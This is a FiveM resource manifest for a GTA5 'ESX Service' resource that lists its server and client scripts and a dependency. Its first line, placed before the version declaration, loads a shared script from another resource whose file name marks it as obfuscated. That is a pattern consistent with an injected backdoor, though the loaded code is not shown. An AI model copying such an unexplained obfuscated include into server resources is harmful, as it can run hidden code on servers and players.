shared_script '@vin_asuransikeliling/shared_fg-obfuscated.lua'
fx_version 'adamant'

game 'gta5'

description 'ESX Service'

version '1.6.5'

shared_script '@vinzz/imports.lua'

server_scripts {
	'server/main.lua'
}

client_scripts {
	'client/main.lua'
}

dependency 'vinzz'
